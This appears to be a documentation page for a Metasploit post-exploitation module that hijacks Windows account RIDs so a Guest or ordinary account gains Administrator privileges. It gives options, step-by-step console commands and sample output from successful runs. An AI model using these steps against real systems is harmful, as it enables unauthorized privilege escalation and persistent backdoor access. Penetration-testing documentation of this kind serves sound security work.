{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/rid_hijack","result":{"data":{"moduleMetadataJson":{"id":"0116232b-7dd0-5e0d-8c8d-1b6fc7dc4904","name":"Windows Manage RID Hijacking","fullname":"post/windows/manage/rid_hijack","description":"This module will create an entry on the target by modifying some properties\n        of an existing account. It will change the account attributes by setting a\n        Relative Identifier (RID), which should be owned by one existing\n        account on the destination machine.\n\n        Taking advantage of some Windows Local Users Management integrity issues,\n        this module will allow to authenticate with one known account\n        credentials (like GUEST account), and access with the privileges of another\n        existing account (like ADMINISTRATOR account), even if the spoofed account is\n        disabled.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/rid_hijack","documentationSlug":"/modules/documentation/post/windows/manage/rid_hijack"},"documentation":{"html":"<h2 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h2>\n<p>This module will create an entry on the target by modifying some properties of an existing account. It will change the account attributes by setting a Relative Identifier (RID), which should be owned by one existing account on the destination machine.</p>\n<p>Taking advantage of some Windows Local Users Management integrity issues, this module will allow to authenticate with one known account credentials (like GUEST account), and access with the privileges of another existing account (like ADMINISTRATOR account), even if the spoofed account is disabled.</p>\n<p>By using a <code class=\"language-text\">meterpreter</code> session against a Windows host, the module will try to acquire <em><strong>SYSTEM</strong></em> privileges if needed, and will modify some attributes to hijack the permissions of an existing local account and set them to another one.</p>\n<p>For more information see <a href=\"http://csl.com.co/rid-hijacking/\">csl.com.co</a>.</p>\n<h2 id=\"vulnerable-software\" style=\"position:relative;\"><a href=\"#vulnerable-software\" aria-label=\"vulnerable software permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Software</h2>\n<p>This module has been tested against:</p>\n<ul>\n<li>Windows XP, 2003. (32 bits)</li>\n<li>Windows 8.1 Pro. (64 bits)</li>\n<li>Windows 10. (64 bits)</li>\n<li>Windows Server 2012. (64 bits)</li>\n</ul>\n<p>This module was not tested against, but may work on:</p>\n<ul>\n<li>Other versions of windows (x86 and x64).</li>\n</ul>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<ul>\n<li><strong>GETSYSTEM</strong>: Try to get <em><strong>SYSTEM</strong></em> privileges on the victim. Default: <code class=\"language-text\">false</code></li>\n<li><strong>GUEST_ACCOUNT</strong>: Use the <em><strong>GUEST</strong></em> built-in account as the destination of the privileges to be hijacked. Set this account as the <em>hijacker</em>. Default: <code class=\"language-text\">false</code>.</li>\n<li><strong>SESSION</strong>: The session to run this module on. Default: <code class=\"language-text\">none</code>.</li>\n<li><strong>USERNAME</strong>: Set the user account (<em>SAM Account Name</em>) of the victim host which will be the destination of the privileges to be <em>hijacked</em>. Set this account as the <em>hijacker</em>. If <strong>GUEST_ACCOUNT</strong> option is set to <code class=\"language-text\">true</code>, this parameter will be ignored if defined. Default: <code class=\"language-text\">none</code>.</li>\n<li><strong>PASSWORD</strong>: Set or change the password of the account defined as the destination of the privileges to be hijacked, either <em><strong>GUEST</strong></em> account or the user account set in <strong>USERNAME</strong> option. Set password to the <em>hijacker</em> account. Default: <code class=\"language-text\">none</code>.</li>\n<li><strong>RID</strong>: Specify the RID number in decimal of the <em>victim account</em>. This number should be the RID of an existing account on the target host, no matter if it is disabled (i.e.: The RID of the <em><strong>Administrator</strong></em> built-in account is 500). Set the RID owned by the account that will be <em>hijacked</em>. Default: <code class=\"language-text\">500</code></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Get a <code class=\"language-text\">meterpreter</code> session on some host.</li>\n<li>Do: <code class=\"language-text\">use post/windows/manage/rid_hijack</code></li>\n<li>Do: <code class=\"language-text\">set SESSION &lt;SESSION_ID&gt;</code> replacing &#x3C;SESSION_ID> with the desired session.</li>\n<li>Do: <code class=\"language-text\">set GET_SYSTEM true</code>.</li>\n<li>Do: <code class=\"language-text\">set GUEST_ACCOUNT true</code>.</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>Log in on the victim host with the GUEST account credentials.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"assigning-administrator-privileges-to-guest-built-in-account\" style=\"position:relative;\"><a href=\"#assigning-administrator-privileges-to-guest-built-in-account\" aria-label=\"assigning administrator privileges to guest built in account permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assigning Administrator privileges to Guest built-in account.</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(rid_hijack) &gt; set GETSYSTEM true\nGETSYSTEM =&gt; true\nmsf post(rid_hijack) &gt; set GUEST_ACCOUNT true\nGUEST_ACCOUNT =&gt; true\nmsf post(rid_hijack) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf post(rid_hijack) &gt; run\n\n[*] Checking for SYSTEM privileges on session\n[+] Session is already running with SYSTEM privileges\n[*] Target OS: Windows 8.1 (Build 9600).\n[*] Target account: Guest Account\n[*] Target account username: Invitado\n[*] Target account RID: 501\n[*] Account is disabled, activating...\n[+] Target account enabled\n[*] Overwriting RID\n[+] The RID 500 is set to the account Invitado with original RID 501\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"results-after-login-in-as-the-guest-account\" style=\"position:relative;\"><a href=\"#results-after-login-in-as-the-guest-account\" aria-label=\"results after login in as the guest account permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Results after login in as the Guest account.</h4>\n<p><img src=\"https://user-images.githubusercontent.com/14118912/36490462-4bf84d68-16f6-11e8-811c-bf2d8c42b93d.PNG\" alt=\"guest_account\"></p>\n<h3 id=\"assigning-administrator-privileges-to-local-custom-account\" style=\"position:relative;\"><a href=\"#assigning-administrator-privileges-to-local-custom-account\" aria-label=\"assigning administrator privileges to local custom account permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assigning Administrator privileges to local custom account.</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(rid_hijack) &gt; set GETSYSTEM true\nGETSYSTEM =&gt; true\nmsf post(rid_hijack) &gt; set GUEST_ACCOUNT false\nGUEST_ACCOUNT =&gt; false\nmsf post(rid_hijack) &gt; set USERNAME testuser\nUSERNAME =&gt; testuser\nmsf post(rid_hijack) &gt; run\n\n[*] Checking for SYSTEM privileges on session\n[+] Session is already running with SYSTEM privileges\n[*] Target OS: Windows 8.1 (Build 9600).\n[*] Checking users...\n[+] Found testuser account!\n[*] Target account username: testuser\n[*] Target account RID: 1002\n[+] Target account is already enabled\n[*] Overwriting RID\n[+] The RID 500 is set to the account testuser with original RID 1002\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"results-after-login-in-as-the-testuser-account\" style=\"position:relative;\"><a href=\"#results-after-login-in-as-the-testuser-account\" aria-label=\"results after login in as the testuser account permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Results after login in as the <em>testuser</em> account.</h4>\n<p><img src=\"https://user-images.githubusercontent.com/14118912/36490561-837bd2f0-16f6-11e8-8dc6-53283bb4d9ea.PNG\" alt=\"testuser\"></p>\n<h3 id=\"assigning-custom-privileges-to-guest-built-in-account-and-setting-new-password-to-guest\" style=\"position:relative;\"><a href=\"#assigning-custom-privileges-to-guest-built-in-account-and-setting-new-password-to-guest\" aria-label=\"assigning custom privileges to guest built in account and setting new password to guest permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assigning custom privileges to Guest built-in account and setting new password to Guest.</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(rid_hijack) &gt; set GUEST_ACCOUNT true\nGUEST_ACCOUNT =&gt; true\nmsf post(rid_hijack) &gt; set RID 1002\nRID =&gt; 1002\nmsf post(rid_hijack) &gt; set PASSWORD Password.1\nPASSWORD =&gt; Password.1\nmsf post(rid_hijack) &gt; run\n\n[*] Checking for SYSTEM privileges on session\n[+] Session is already running with SYSTEM privileges\n[*] Target OS: Windows 8.1 (Build 9600).\n[*] Target account: Guest Account\n[*] Target account username: Invitado\n[*] Target account RID: 501\n[+] Target account is already enabled\n[*] Overwriting RID\n[+] The RID 1002 is set to the account Invitado with original RID 501\n[*] Setting Invitado password to Password.1\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"assigning-custom-privileges-to-local-custom-account-and-setting-new-password-to-custom-account\" style=\"position:relative;\"><a href=\"#assigning-custom-privileges-to-local-custom-account-and-setting-new-password-to-custom-account\" aria-label=\"assigning custom privileges to local custom account and setting new password to custom account permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assigning custom privileges to local custom account and setting new password to custom account.</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(rid_hijack) &gt; set GUEST_ACCOUNT false\nGUEST_ACCOUNT =&gt; false\nmsf post(rid_hijack) &gt; set USERNAME testuser\nUSERNAME =&gt; testuser\nmsf post(rid_hijack) &gt; set PASSWORD Password.2\nPASSWORD =&gt; Password.2\nmsf post(rid_hijack) &gt; run\n\n[*] Checking for SYSTEM privileges on session\n[+] Session is already running with SYSTEM privileges\n[*] Target OS: Windows 8.1 (Build 9600).\n[*] Checking users...\n[+] Found testuser account!\n[*] Target account username: testuser\n[*] Target account RID: 1002\n[+] Target account is already enabled\n[*] Overwriting RID\n[+] The RID 1002 is set to the account testuser with original RID 1002\n[*] Setting testuser password to Password.2\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"0116232b-7dd0-5e0d-8c8d-1b6fc7dc4904"}}}